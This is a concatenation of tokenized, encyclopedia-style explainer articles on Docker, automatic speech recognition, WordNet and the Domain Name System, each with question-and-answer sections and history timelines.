It points to a filesystem outside the container .
We can therefore exit containers without losing app data .
Newer containers that come up can access the same data using volumes .
The important thing is to implement locks or something equivalent for concurrent write access .
Volumes can be created via Dockerfile or the Docker CLI tool .
Apart from sharing data or state across containers , volumes are useful for sharing data ( such as code ) between containers and host machines .
They 're also useful for handling large files ( logs or databases ) because writing to volumes is faster than writing to Docker 's Union File System ( UFS ) that uses IO expensive copy - on - write ( CoW ) .
What 's the purpose of a Dockerfile ?
Dockerfile commands building a layered Docker image .
Source : Grace 2017 .
A dockerfile is nothing more than a text file containing instructions to build a Docker image .
Each instruction creates one read - only layer of the image .
When the container runs , a new writable layer is created on top to capture runtime changes .
Let 's take the example of a Node.js application .
The instruction ` FROM node:9.3.0-alpine ` specifies the base image of Node.js version 9.3.0 running on Alpine Linux .
` ADD ` instruction can be used to add files .
` RUN ` can be used for framework installation or application building .
To expose ports from the container , use ` EXPOSE ` .
To finally launch the app within the container , use the ` CMD ` .
For more details , read the Dockerfile Reference and the best practices for writing Dockerfiles .
What are some basic Docker commands that a beginner should know ?
A selection of Docker comments showing how they affect containers .
Source : Docker Saigon 2016 .
We describe some Docker commands listed in the official Docker documentation : To build a new image from a Dockerfile use the ` build ` command .
We can then push this to a registry using ` push ` .
Commands ` search ` and ` pull ` can be used to find and download an image from the registry to our local system .
To create a new image from a running container 's changes , we can use ` commit ` .
To list images , use ` images ` .
A downloaded image can be removed using ` rmi ` .
Once we have an image , we can create and start a container using ` create ` and ` start ` .
Containers can be stopped using ` stop ` or ` kill ` .
A running container can be restarted using ` restart ` .
We can use ` rm ` to remove containers .
The command ` ps ` will list all running containers .
To list stopped containers as well , use the " -all " option .
Commands that deal with processes inside containers include ` run ` , ` exec ` , ` pause ` , ` unpause ` and ` top ` .
Commands that deal with container filesystem include ` cp ` , ` diff ` , ` export ` and ` import ` .
Docker is debuted publicly and open source at PyCon , Santa Clara .
Earlier work on Docker can be traced to 2010 .
Red Hat and Docker announce a collaboration around Fedora , Red Hat Enterprise Linux , and OpenShift .
Docker replaces LXC with libcontainer as the runtime .
The latter is written in Golang and developed by the Docker team .
The daemon containerd uses runc .
Source : Jernigan 2016 .
Docker , CoreOS and others form the Open Container Initiative ( OCI ) .
At the same time , Docker 's libcontainer becomes a standalone OCI - compliant runtime called runc .
In December 2015 , Docker announces containerd , a daemon to manage runc .
At this time , many companies , including Cisco , IBM , Google , Microsoft , Huawei and Red Hat are the main contributors to Docker .
In June , Docker started to support container orchestration with swarm mode .
A YAML compose file ` docker-compose.yml ` can be used to deploy swarm mode services .
Docker releases Docker Enterprise Edition .
It renames the free open source product to Docker Community Edition .
Version 1.0 of OCI runtime and image format specifications have been released .
Docker celebrates its fifth birthday .
By now , there 's an estimated 37 billion container downloads , 3.5 million dockerized apps and 450 + customers using Docker Enterprise Edition .
Overview of a speech recognition system .
Source : Alvarez and Carmiel 2017 .
Speech Recognition is the process by which a computer maps an acoustic speech signal to text .
Speech Recognition is also known as Automatic Speech Recognition ( ASR ) or Speech To Text ( STT ) .
Speech Recognition crossed over to ' Plateau of Productivity ' in the Gartner Hype Cycle as of July 2013 , which indicates its widespread use and maturity in present times .
In the longer term , researchers are focusing on teaching computers not just to transcribe acoustic signals but also to understand words .
Automatic speech understanding is when a computer maps an acoustic speech signal to an abstract meaning .
It is a sub - field of computational linguistics ( an interdisciplinary field concerned with the statistical or rule - based modeling of natural language ) that develops methodologies and technologies that enable the recognition and translation of spoken language into text by computers .
What are the steps involved in the process of speech recognition ?
Steps involved in Speech Recognition .
Source : Peterson 2015 , 1:04 .
We can identify the following main steps : Analog - to - Digital Conversion : Speech is usually recorded / available in analog format .
Standard sampling techniques / devices are available to convert analog speech to digital using techniques of sampling and quantization .
Digital speech is usually a one - dimension vector of speech samples , each of which is an integer .
Speech Pre - processing : Recorded speech usually comes with background noise and long sequences of silence .
Speech pre - processing involves identification and removal of silence frames and signal processing techniques to reduce / eliminate noise .
After pre - processing , the speech is broken down into frames of 20ms each for further steps of feature extraction .
Feature Extraction : It is the process of converting speech frames into feature vector which indicates which phoneme / syllable is being spoken .
Word Selection : Based on a language model / probability model , the sequence of phonemes / features are converted into the word being spoken .
Which are the popular feature extraction methods ?
While there are many feature extraction methods , we note three of them : Relative Spectral - Perceptual Linear Prediction ( RASTA - PLP ) : PLP is a way of warping spectra to minimize differences between speakers while preserving important speech information .
RASTA applies a band - pass filter to the energy in each frequency subband in order to smooth over short - term noise variations and to remove any constant offset resulting from static spectral coloration in the speech channel e.g. from a telephone line Linear Predictive Cepstral Coefficients ( LPCC ) : A cepstrum is the result of taking the inverse Fourier transform ( IFT ) of the logarithm of the estimated spectrum of a signal .
The power cepstrum is used in the analysis of human speech .
Mel Frequency Cepstral Coefficients ( MFCC ) : These are derived from a type of cepstral representation of the audio clip ( a nonlinear " spectrum - of - a - spectrum " ) .
The difference between LPCC & mel - frequency cepstrum is that in the MFCC , the frequency bands are equally spaced on the mel scale , which approximates the human auditory system 's response more closely than the linearly - spaced frequency bands used in the normal cepstrum .
This frequency warping allows for better representation of sound .
Which are the traditional Probability Mapping and Selection methods ?
Hidden Markov Model .
Source : Automatic Speech recognition - ESAT A Hidden Markov Model is a type of graphical model often used to model temporal data .
Hidden Markov Models ( HMMs ) assume that the data observed is not the actual state of the model , but is instead generated by the underlying hidden ( the H in HMM ) states .
While this would normally make inference difficult , the Markov Property ( the first M in HMM ) of HMMs makes inference efficient .
The hidden Markov model can be represented as the simplest dynamic Bayesian network .
The mathematics behind the HMM was developed by L. E. Baum and coworkers .
Because of their flexibility and computational efficiency , Hidden Markov Models have found a wide application in many different fields like speech recognition , handwriting recognition , and speech synthesis .
How is the accuracy of a speech recognition program validated ?
Speech Recognition - Word Error Rate .
Source : Finding a Voice | The Economist : 2017 - 05 - 01 Word error rate ( WER ) is a common metric of the performance of a speech recognition or machine translation system .
Generally , it is measured on the Switchboard - a recorded corpus of conversations between humans discussing day - to - day topics .
This has been used over two decades to benchmark speech recognition systems .
There are other corpora like LibriSpeech ( based on public domain audio books ) and Mozilla ’s Common Voice project .
For some languages , like Mandarin , the metric is often CER - Character Error Rate .
There is also an Utterance Error Rate .
An IEEE paper that focussed on ASR and machine translator ( MT ) interactions , in a speech translation system , showed that BLEU - oriented global optimisation of ASR system parameters improves translation quality by an absolute 1.5 % BLEU score , while sacrificing WER over the conventional WER - optimised ASR system .
Therefore , the choice of metrics for ASR optimisation is context and application dependent .
How has speech recognition evolved over the years ?
Milestones in Speech Recognition and Understanding Technology over the Past 40 Years .
DNNs replacing Gaussian Mixture Models .
Source : Automatic Speech Recognition – A Brief History of Technology Development by B.H. Juang & Lawrence R. Rabiner , Georgia Institute of Technology , Atlanta & MIT Lincoln Library Starting from the 1960s , the pattern - recognition based approaches started making speech recognition practical for applications with limited vocabulary with the use of LPC ( Linear Predictive Coefficients ) and LPCC ( Linear Predictive Cepstral Coefficient ) based techniques .
The advantage of this technique was that low resources were required to build this model and could be used for applications requiring up to about 300 words .
In the late 1970s , Paul Mermelstein found a new feature called MFCC ( Mel - frequency Cepstral Coefficients ) .
This soon became the de - facto approach for feature extraction and helped to tackle applications related to multi - speaker as well as multi - language speech recognition .
In the 1990s , H. Hermansky came up with the RASTA - PLP approach ( Relative Spectral Transform - Perceptual Linear Prediction ) of feature extraction which could be used for applications requiring very large vocabulary with multiple speakers and multiple languages with good accuracy .
What are the AI - based approaches to speech recognition ?
Data flows through the network .
Source : Deep Speech by Mozilla In the 1990s and in early 2000s , Deep Learning techniques involving Recurrent Neural Networks were applied to Speech Recognition .
In the 2000s , the variant of RNNs using LSTM ( Long Short Term Memory ) to include Long Term Memory aspects into the model helped to minimise or avoid the problems of vanishing gradient or exploding gradients as part of training the RNNs .
Baidu research released DeepSpeech 2014 achieving a WER of 11.85 % using RNN .
They leveraged the “ Connectionist Temporal Classification ” loss function .
With DeepSpeech2 in 2015 , they achieved a 7x increase in speed using GRUs ( Gated Recurrent Units ) .
DeepSpeech3 was released in 2017 .
They perform an empirical comparison between three models — CTC which powered Deep Speech 2 , attention - based Seq2Seq models which powered Listend - Attend - Spell among others , and RNN - Transducer for end - to - end speech recognition .
The RNN - Transducer could be thought of as an encoder - decoder model which assumes the alignment between input and output tokens is local and monotonic .
This makes the RNN - Transducer loss a better fit for speech recognition ( especially when online ) than attention - based Seq2Seq models by removing extra hacks applied to attentional models to encourage monotonicity .
How is the speed of a speech recognition system measured ?
Calculating the Real Time Factor .
Source : Ondrej Platek Real Time Factor is a very natural measure of a speech decoding speed that expresses how much the recogniser decodes slower than the user speaks .
The latency measures the time between the end of the user 's speech and the time when a decoder returns the hypothesis , which is the most important speed measure for ASR .
Real - time Factor ( RTF ) : the ratio of the speech recognition response time to the utterance duration .
Usually both mean RTF ( average over all utterances ) , and 90th percentile RTF is examined in efficiency analysis .
How is the Word Error Rate calculated ?
Calculation of Word Error Rate ; Chart showing the reduction of ASR error rate over time , attributed to deep learning .
Source : Nuance , Sonix In October 2016 , Microsoft announced its ASR had a WER of 5.9 % against the Industry standard Switchboard speech recognition task .
This was surpassed by IBM Watson in March 2017 with a WER of 5.5 % .
In May 2017 , Google announced it reached a WER of 4.9 % , however Google does not benchmark against the Switchboard .
ASR systems have seen big improvements in recent years due to more efficient acoustic models that use Deep Neural Networks ( DNNs ) to determine how well HMM states fit the extracted acoustic features rather than statistical techniques such as Gaussian Mixture Models , which were the preferred method for several years .
Which are the popular APIs that one can use to incorporate automatic speech recognition in an application ?
Speech Recognition — A comparison of popular services ( EN ) .
Source : Bjorn Vuylsteker , Youtube - Feb 9 , 20 Here 's a selection of popular APIs : Bing Speech API , Nuance Speech Kit , Google Cloud Speech API , AWS Transcribe , IBM Watson Speech to Text , Speechmatics , Vocapia Speech to Text API , LBC Listen By Code API , Kaldi , CMU Sphinx .
What are the applications for speech recognition ?
Some applications of ASR .
Source : HMB431 2016 .
Applications of speech recognition are diverse and we note a few : Aerospace ( e.g. space exploration , spacecraft , etc .
) NASA 's Mars Polar Lander used speech recognition technology from Sensory , Inc. in the Mars Microphone on the Lander .
Automatic subtitling with speech recognition Automatic translation Court reporting ( Realtime Speech Writing ) eDiscovery ( Legal discovery ) Education ( assisting in learning a second language ) Hands - free computing : Speech recognition computer user interface Home automation ( Alexa , Google Home etc .
) Interactive voice response Medical transcription Mobile telephony , including mobile email Multimodal interaction People with disabilities Pronunciation evaluation in computer - aided language learning applications Robotics Speech - to - text reporter ( transcription of speech into text , video captioning , Court reporting ) Telematics ( e.g. vehicle Navigation Systems ) User interface in telephony Transcription ( digital speech - to - text ) Video games , with Tom Clancy 's EndWar and Lifeline as working examples Virtual assistant ( e.g. Apple 's Siri ) Which are the available open source ASR toolkits ?
Comparison of open source and free speech recognition toolkits .
Source : Silicon Valley Data Science Here 's a selection of open source ASR toolkits : Microsoft Cognitive Toolkit , a deep learning system that Microsoft used for its ASR system , is available on GitHub through an open source license .
The Machine Learning team at Mozilla Research has been working on an open source Automatic Speech Recognition engine modelled after the Deep Speech papers published by Baidu .
It has a WER of 6.5 percent on LibriSpeech ’s test - clean set .
Kaldi is integrated with TensorFlow .
Its code is hosted on GitHub with 121 contributors .
It originated at a 2009 workshop at John Hopkins University .
It is designed for local installation .
CMU Sphinx is from Carnegie Mellon University .
Java and C versions exist on GitHub .
HTK began at Cambridge University in 1989 .
Julius has been in development since 1997 and had its last major release in September of 2016 .
ISIP originated from Mississippi State .
It was developed mostly from 1996 to 1999 , with its last release in 2011 .
VoxForge - crowdsourced repository of speech recognition data and trained models .
Bell Labs researchers - Davis , Biddulph and Balashak - built a system for single - speaker digit ( 10 ) recognition .
Their system worked by locating the formants in the power spectrum of each utterance .
They were basically creating realisations of earlier analysis establishing relationships between sound classes and signal spectrum by Harvey Fletcher and Homer Dudley , both from AT&T Bell Laboratories .
Speech recognition research at Bell Labs was defunded after an open letter by John Robinson Pierce that was critical of speech recognition research .
IBM demonstrates its ' Shoebox ' machine at the 1962 World Fair , which could understand 16 words spoken in English .
Dabbala Rajagopal " Raj " Reddy conducts a demonstration of voice control of a robot , large vocabulary connected speech recognition , speaker independent speech recognition and unrestricted vocabulary dictation .
Hearsay - I is one of the first systems capable of continuous speech recognition .
Reddy 's work lays the foundation for more than three decades of research at Carnegie Mellon University with his work in the field of continuous speech recognition based on dynamic tracking of phonemes .
Funding by DARPA 's Speech Understanding Research ( SUR ) program was responsible for Carnegie Melon 's " Harpy " speech understanding system , that could understand 1011 words .
In Russia , Professor Taras Vintsyuk proposes the use of dynamic programming methods for time aligning a pair of speech utterances ( generally known as Dynamic Time Warping ( DTW ) ) .
Velichko and Zagoruyko use Vintsyuk 's work to advance the use of pattern recognition ideas in speech recognition .
The duo built a 200-word recogniser .
Professor Victorov developed a system that recognises 1000 words in 1980 .
The first commercial speech recognition company - Threshold Technology . James Baker started working on HMM - based speech recognition systems .
In 1982 , James and Janet Baker ( students of Raj Reddy ) cofound Dragon Systems , one of the first companies to use Hidden Markov Models in speech recognition .
Tony Robinson publishes work on neural networks in ASR .
In 2012 , he founded Speechmatics , offering cloud - based speech recognition services .
In 2017 , the company announced a breakthrough in accelerated new language modelling .
By 1994 , Robinson 's neural network system was in the top 10 in the world in the DARPA Continuous Speech Evaluation trial , while the other nine were HMMs .
.
Google began its first effort at speech recognition after hiring some researchers from Nuance .
By around 2007 itself , LSTM trained by Connectionist Temporal Classification ( CTC ) started to outperform traditional speech recognition in certain applications .
Google 's speech recognition experiences a performance jump of 49 % through CTC - trained LSTM .
Mozilla DeepSpeech & Common Voice .
Source : Mozilla Mozilla open sources speech recognition model - DeepSpeech and voice dataset - Common Voice .
Baidu Research releases Deep Speech 3 , which enables end - to - end training using a pre - trained language model .
Deep Speech 1 was Baidu 's PoC , followed by Deep Speech 2 that demonstrated how models generalise well to different languages .
WordNet Browser .
Source : Wikipedia 2020 .
WordNet is a database of words in the English language .
Unlike a dictionary that 's organized alphabetically , WordNet is organized by concept and meaning .
In fact , traditional dictionaries were created for humans but what 's needed is a lexical resource more suited for computers .
This is where WordNet becomes useful .
WordNet is a network of words linked by lexical and semantic relations .
Nouns , verbs , adjectives and adverbs are grouped into sets of cognitive synonyms , called synsets , each expressing a distinct concept .
Synsets are interlinked by means of conceptual - semantic and lexical relations .
The resulting network of meaningfully related words and concepts can be navigated with the WordNet browser .
WordNet is freely and publicly available for download .
What 's the distinction between WordNet and a thesaurus ?
Lexical Relations .
Source : Abd - Elwasaa 2016 .
A thesaurus provides similar words ( synonyms ) and opposites ( antonyms ) .
WordNet does much more than this .
Via synsets , WordNet brings together specific word senses .
As a result , words that are found in close proximity to one another in the network are semantically disambiguated .
A synset is also linked to other synsets by semantic relations .
Such relations are missing in a thesaurus .
These relations are based on concepts and therefore give us valuable information about words .
For example , the verbs ( communicate , talk , whisper ) are all about talking , but the manner goes from general to specific .
A similar example with nouns would be ( furniture , bed , bunkbed ) .
An example of a part - whole relationship is ( leg , chair ) .
These sorts of relations are captured on WordNet .
The nodes of WordNet are synsets .
Links between two nodes are either conceptual - semantic ( bird , feather ) or lexical ( feather , feathery ) .
Lexical links subsume conceptual - semantic links .
Could you explain WordNet 's synsets with an example ?
Synsets of the word ' bike ' .
Source : Educative 2020 .
Consider the word ' bike ' .
It has multiple meanings .
It could be a motorcycle ( noun ) , a bicycle ( noun ) or bicycle ( verb ) .
WordNet represents these as three synsets with unique names : ` motorcycle.n.01 ` , ` bicycle.n.01 ` and ` bicycle.v.01 ` .
Each synset has an array of lemma names that share the same concept .
Thus , ` motorcycle.n.01 ` has the words ' motorcycle ' and ' bike ' .
The synset also has a definition , also called gloss .
It has now become clear that the word ' bike ' must be present in all the three synsets , each representing a different concept or meaning .
It 's also possible to move from one synset to another by certain relations .
For example , ` motor_vehicle.n.01 ` is a more general concept of ` motorcycle.n.01 ` whereas ` minibike.n.01 ` and ` trail_bike.n.01 ` are more specific concepts of ` motorcycle.n.01 ` .
Thus , synsets are linked by relations , making WordNet a network of conceptually related words .
What is WordNet used for ?
Path lengths can be used to compute word similarity .
Source : Jurafsky and Martin 2019 , fig .
C.5 .
WordNet is typically used by linguistics , psychologists and those working in the fields of AI and NLP .
Among its many applications are word sense disambiguation , information retrieval , automatic text classification , automatic text summarization , and machine translation .
WordNet can be used as a thesaurus except that words are organized by concept and semantic / lexical relations .
In NLP , WordNet has become a useful tool for word sense disambiguation .
When a word has multiple senses , WordNet can help in identifying the correct sense .
WordNet 's symbolic approach complements statistical approaches .
Measuring similarity between words is another application .
Different algorithms exist to measure word similarity .
Such a similar measure can be used in spelling checking or question answering .
However , WordNet is limited to noun - noun or verb - verb similarity .
We ca n't compare nouns and verbs , or use other parts of speech .
Where neural networks are used for NLP work , word embeddings ( low - dimensional vectors ) are used .
However , word embeddings do n't discriminate between different senses .
WordNet has been applied to create sense embeddings .
What are the major lexical relations captured in WordNet ?
Semantic relations on WordNet .
Source : Miller 1995 , table 1 .
Major lexical relations include the following : Synonymy : Synonyms are words that have similar meanings .
Often , context determines which synonym is best suited .
Polysemy : Polysemous words have more than one sense .
The word bank can mean river bank , where money is stored , a building , or institution .
Polysemy is associated with the terms homonymy and metonymy .
Hyponymy / Hypernymy : is a relation .
Robin is a hyponym for bird since robin is a type of bird .
Likewise , bird is a hypernym of robins .
Thus , hypernyms are synsets that are more general whereas hyponyms are more specific .
Meronymy / Holonymy : Part - whole relationship .
beak is a meronym of a bird since the beak is part of a bird 's anatomy .
Likewise , bird is a holonym for beak .
WordNet identifies three types of relations : components ( leg , table ) , constituents ( oxygen , water ) , and members ( parents , family ) .
Antonymy : Lexical opposites such as ( large , small ) .
Troponymy : Applicable for verbs .
For example , whisper is a troponym for talk since whisper elaborates on the manner of talking .
What are some limitations of WordNet ?
WordNet does n't include syntactic information , although later work showed that , at least for verbs , there 's a correlation between semantic makeup and syntactic behaviour .
Semantic relations are more suited to concrete concepts , such as a tree being a hypernym of conifer .
It 's less suited to abstract concepts such as fear or happiness , where it 's hard to identify hyponym / hypernym relations .
Some relations may also be language specific and , therefore , can make different wordnets less interoperable .
WordNet 's senses are sometimes too fine - grained for automatic sense disambiguation .
One possible solution is to group related senses .
WordNet does n't include information about etymology .
Thus , word origins and how they 've evolved over time are not captured .
Offensive words are also included and it 's left to applications to decide what 's offensive since meanings change over time .
Pronunciation is missing .
There 's limited information about usage .
WordNet covers most of everyday English but does n't include domain - specific terminology .
WordNet was created in the mid-1980s when digital corpora was hard to come by .
WordNet was assembled by the intuition of lexicographers rather than by a corpus - induced dictionary .
Murray ’s Oxford English Dictionary ( OED ) is compiled " on historical principles " .
By focusing on historical evidence , the OED , like other standard dictionaries , neglects questions concerning the synchronic organization of lexical knowledge .
Hypothetical memory structure of a 3-level hierarchy .
Source : Collins and Quillian 1969 , fig .
1 .
Collins and Quillian propose a hierarchical semantic memory model for storing information in computer systems .
They hypothesize that human memory is in fact organized in this manner .
They test their hypothesis by measuring retrieval times .
For example , if a person is asked if a canary can fly , the actual retrieval might involve inference from a memory that contains " canary is a bird " and " birds can fly " .
This important work goes on to influence the creation of WordNet almost two decades later .
Miller and Johnson - Laird propose psycholexicology , a study of the lexical component of language , which is about words and vocabulary of a language .
Some psychologists and linguists at Princeton University started developing a lexical database .
While a dictionary helps us search for words alphabetically , a lexical database allows us to search based on concepts .
This marks the beginning of Princeton WordNet .
We can say that it 's a dictionary based on psycholinguistic principles .
WordNet 1.0 has been released .
EuroWordNet was started as an EU project covering languages Dutch , Spanish and Italian .
It 's inspired by and is designed to link to Princeton WordNet .
In 1997 , more languages were added : German , French , Czech and Estonian .
The project was completed towards the end of 1999 .
One novel feature is the Inter - Lingual - Index ( ILI ) that defines equivalence relations between synsets in different languages .
In later years , this work is extended by other projects : EUROTERM , BALKANET , and MEANING .
In 2006 , it was noted that databases existed for 35 languages globally .
WordNet 2.1 has been released .
There 's support for UNIX - like systems and Windows .
WordNet 2.1 contains almost 118,000 synsets , comprising more than 81,000 noun synsets , 13,600 verb synsets , 19,000 adjective synsets , and 3,600 adverb synsets .
Average polysemy of words in WordNet 3.0 .
Source : WordNet Docs 2020 .
WordNet 3.0 has been released .
This release has 117,798 nouns , 11,529 verbs , 22,479 adjectives , and 4,481 adverbs .
The average noun has 1.23 senses , and the average verb has 2.16 senses .
WordNet 3.1 has been released .
It 's available only online .
It 's possible to download only the database and use the installation from 3.0 .
This version contains 155,327 words organized into 175,979 synsets for a total of 207,016 word - sense pairs .
Its compressed size is 12 MB .
Under the guidance of the Global WordNet Association , the English WordNet was created on GitHub as a fork of the Princeton WordNet 3.1 .
Annual updates of this resource happen in April 2019 and April 2020 .
DNS translates names to IP addresses .
Source : Bilal 2018 .
The internet is a network of networks .
Any computer or other network device participating on the Internet for providing or receiving services has an address called IP address .
This address is used to communicate with other computers .
But since it 's difficult for human beings to remember IP addresses , the concept of Domain Name , or Fully Qualified Domain Name ( FQDN ) was introduced .
This name is a sequence of human - readable characters that end with .com , .in , .org , etc .
The use of domain names is a problem for machines since they communicate using IP addresses .
This is because the Internet is based on the TCP / IP protocol , which uses IP addresses for identifying devices .
Hence , domain names given by humans must be resolved to specific IP addresses .
For this purpose , there are name servers .
The entire system is called a Domain Name System ( DNS ) .
Could you explain DNS and why it is needed ?
An introduction to DNS .
Source : PowerCert Animated Videos 2016 .
Because names are easier to remember than numbers , DNS is useful to refer to online resources by name .
A DNS is like a " phonebook for the Internet " .
Another benefit of DNS is that IP addresses of servers can be changed while retaining the same names .
Moreover , a name can point to multiple IP addresses for redundancy and performance .
Even before DNS was invented , names were used instead of IP addresses , but those names were not organized in a hierarchy .
The mapping of names to IP addresses was also kept in a file called HOSTS.TXT that was almost manually updated and synchronized across network nodes .
Thus , the system was centralized and did not scale well when the Internet started to grow exponentially through the 1980s .
DNS came in as a scalable solution .
The system was designed to be distributed .
Domain names were organized into hierarchical namespaces .
Two important aspects of DNS are zones and caching .
Zones enable more flexible and granular management of domains .
Caching improves response times by locally storing responses for future queries .
Could you explain the DNS architecture and protocol flow ?
DNS protocol flow for accessing Medium.com .
Source : Don 2018 .
A DNS is a hierarchical system .
It starts with a root name server below , which are the top - level domain ( TLD ) servers .
Examples of TLD are the traditional ones ( .com , .net , .uk , .in , etc .
) plus newer TLDs ( .phone , .ieee , etc .
) introduced in 2013 .
Below these are the second - level domain ( SLD ) servers , such as wikipedia.org , .co.uk , etc .
Finally , the domain name is mapped to an IP address by the authoritative nameserver .
For example , there will be an authoritative nameserver for bbc.co.uk .
The client initiates a DNS query , let 's say when trying to access bbc.co.uk .
Between the client and the DNS servers is the recursive resolver .
Its job is to resolve the domain name to its requested IP address .
For bbc.co.uk , the resolver contacts the root name server , which points to the TLD server for .uk TLD ; the resolver contacts the TLD server , which points to the SLD server that manages .co.uk ; the resolver contacts the SLD server to obtain the IP address of bbc.co.uk .
It then caches it for future queries and forwards it to the client .
The client uses this IP address to communicate with the BBC 's server .
Could you explain the different types of DNS servers ?
There are four types of DNS servers : Recursive Resolver : also called DNS Recursor . It 's the first server to receive a DNS request .
It mediates between the client and the nameservers .
If it has cached data , it will use the cache .
If not , it contacts a root server , then a TLD server , and finally the authoritative nameserver .
Root Server : Based on the TLD extension , it points the recursive server to the TLD server to contact .
There are 13 root servers but due to redundancy , there were actually 600 + servers back in October 2016 .
TLD Server : Contains records for all domains belonging to that TLD .
A TLD server will point the recursive server to contact the correct authoritative nameserver for the specific domain .
TLD servers belong to one of two groups : Generic TLD ( gTLD ) ( .com , .org , etc .
) or Country Code TLD ( ccTLD ) ( .uk , .in , etc .
) .
Authoritative Nameserver : This has the IP address of the requested domain name .
If the domain has an alias record ( CNAME ) , it will respond with the alias domain , which will make the recursive server to start a new DNS lookup .
Which are the three Rs of DNS ?
Three entities are involved in DNS : Registrant : Anyone wishing to own a domain name for a period of time must make an application to a registrar .
Suppose you wish to start an online business with the address myspecialcakes.co.uk , you are registered .
Registrar : A registrar processes applications from registrants to register a domain name on their behalf .
A registrar can be an ICANN accredited registrar for some TLDs and a reseller for other TLDs .
If accredited , the registrar will directly interface with registries .
If reseller , the registrar will interface with registrars accredited for those specific TLDs .
Registry : A registry manages the registration of all domains in a specific TLD .
Each registry manages a single TLD , though a single company may run multiple registries .
A registry consists of a database of all registered domain names , rules for domains , and sets registration prices .
What 's a zone in the context of DNS ?
An illustration of DNS zones .
Source : Cloudflare 2019a .
A zone is really an administrative space so that organizations and administrators can manage domains in a granular way .
Each zone can be managed independently of others .
A DNS zone can contain multiple subdomains and multiple zones can be on the same server .
Zones are not about physical or geographic separation .
Rather , they are used for delegating control .
Domains within a zone have to be contiguous .
For example , a zone can not contain only domains " admin.coatbank.com " and " finance.coatbank.com " without also including " coatbank.com " .
In another example , " blog.cloudflare.com " can be in a separate zone while all other subdomains of Cloudflare can be in another zone .
A DNS Zone File is a plain text file saved on a DNS server .
This file contains all the records for every domain within the zone .
A DNS Record is a single entry that maps a name to its IP address .
A zone file stores different types of records but always starts with SOA ( Start of Authority ) record .
A zone file can contain only one SOA record .
What are primary and secondary DNS servers ?
DNS is a critical aspect of the Internet .
If it fails , many Internet services will be affected for any given company : its website , support services , email servers , sales portals , online resource libraries , databases , multiplayer games , etc .
In one test that queried 100,000 authoritative servers for .ca domains , 93 % failed to respond at least once .
This implies that for reliable Internet services we need redundancy .
For this reason , we have secondary servers to take over in case primary servers are down .
Secondary servers also help with load balancing to prevent denial - of - service situations .
Each zone can have only one primary DNS server but any number of secondary servers .
The controlling zone file is on the primary server .
Secondary servers store read - only copies of the controlling zone file via a communication procedure called Zone Transfer .
A primary server for one zone can also be a secondary server for another zone .
What are the different types of DNS records ?
Among the different types are Start of Authority ( SOA ) , Name Server ( NS ) , Mail Exchange ( MX ) , Address ( A ) , AAAA , Canonical Name ( CNAME ) , Alias ( ALIAS ) , Text ( TXT ) , Service Locator ( SRV ) , Pointer ( PTR ) , and more .
When recursive name servers need to contact authoritative name servers , NS records become useful .
The IP address of a domain comes from A. Likewise , for IPv6 addresses , AAAA records are used .
Sometimes a domain name may be redirected to another name , such as wikipedia.com redirecting to wikipedia.org .
CNAME and ALIAS records help in implementing these aliases .
What are some practical challenges with DNS ?
Managing DNS is not trivial .
A DNS is a combination of system administration and network management .
Expert IT staff are needed .
While DNS was designed for addressing , it 's becoming overloaded .
It 's getting tied to applications and application protocols .
The original design assumed DNS would be deeply hierarchical with a high ratio of physical hosts to second - level domains .
However , it 's turned out to be much flatter , with the SOA count possibly exceeding the number of physical hosts .
DNS has security issues .
DNS Spoofing can direct users to malicious websites by tampering with the cache entries .
This can be fixed by deploying DNSSEC .
When changes happen in a DNS zone , such as a website moving to another data centre , other servers may not get the update for as much as 24 hours .
Although DNS is a distributed system , the approval of TLD names is done by ICANN .
Until 2016 , this entity was influenced by the U.S. government .
Even today , it 's said that DNS servers are controlled by governments and large corporations .
For this reason , domain names have been created .
Dot - Bit domains bypass DNS .
They are powered by Namecoin , which is based on Bitcoin .
What are the RFCs and specifications relating to DNS ?
DNS is defined by Request for Comments ( RFC ) documents published by the Internet Engineering Task Force ( IETF ) .
A list of DNS RFCs is available online .
We mention a few important ones : RFC 920 : Domain Requirements RFC 1034 : Domain Names — Concepts and Facilities RFC 1035 : Domain Names — Implementation and Specification RFC 1123 : Requirements for Internet Hosts — Application and Support RFC 882 illustrates the hierarchical nature of domain name spaces .
Source : Mockapetris 1983 , pg .
7 .
Paul Mockapetris invents DNS since he finds that other proposals do not meet the requirements of the Internet .
He also started writing Jeeves , the first DNS server implementation .
The IETF publishes two documents on DNS : RFC 882 for concepts and facilities ; and RFC 883 for implementation and specification .
These early documents were replaced with RFC 1034 and RFC 1035 in November 1987 .
With the publication of RFC 920 : Domain Requirements , this is the " official " beginning of DNS .
This document mentions top - level domain names GOV , EDU , COM , MIL , and ORG .
It gives example names : CCN.OAC.LA.UC.EDU , DASH.MIT.EDU , HP - LABS.CSNET .
Computer manufacturer Symbolics registers symbolic.com , making it the world 's first registered domain within DNS .
The name was sold almost 25 years later in 2009 .
While many older hosts continued to use HOSTS.TXT even in the late 1980s , by 1985 , some hosts used DNS as the sole means of accessing names .
Around the mid-1980s , the Berkeley Internet Name Domain ( BIND ) was created at the University of California at Berkeley .
It 's an implementation of a DNS server for the UNIX platform .
In subsequent years , BIND went on to become the most widely used DNS software .
In September 2000 , BIND version 9 was released .
This is a major rewrite and leads to the deprecation of versions 4 and 8 .
Network Solutions Inc. ( NSI ) that manages domain names started charging for domain name registration .
Earlier , domain name registration was free and managed by the U.S. government .
The Internet Corporation for Assigned Names and Numbers ( ICANN ) was formed to coordinate DNS addressing structures , including managing the top - level domain ( TLD ) name space .
ICANN is taking over from the Internet Assigned Numbers Authority ( IANA ) .
While ICANN is a private entity , its operations are overseen by the US Department of Commerce ( DoC ) .
Mike Mann registered 14,962 domain names in 24 hours , spending about $ 100,000 .
It 's speculative , but buying and selling domain names is big business .
The original creator of DNS , Paul Mockapetris , says in an interview that it 's time for DNS 2.0 that includes security . We need to get to the next level of naming , which combines authentication , but more importantly , a reputation system .
The first four new generic Top - Level Domains ( gTLDs ) are announced .
This is followed by another 69 names in 2013 , 406 names in 2014 , 391 names in 2015 , and 340 names in 2016 .
Generic top - level domains ( gTLDs ) are known to users as the text coming at the end of a URL such as COM , ORG , or EDU .
Some examples of new gTLDs are PHONE , IEEE , SONG , HYUNDAI , GUIDE .
A study of a regulatory filing reveals Cars.com as the most expensive domain name to be sold , valued at $ 872 million .
Other record sales publicly reported until October 2018 include CarInsurance.com ( $ 49.7 m ) , Insurance.com ( $ 35.6 m ) , and VacationRentals.com ( $ 35 m ) .
ICANN 's contract with the U.S Department of Commerce expires .
This completes the privatization of ICANN that was envisioned in 1998 .
Sentiment Analysis .
Source : Paxcom 2016 .
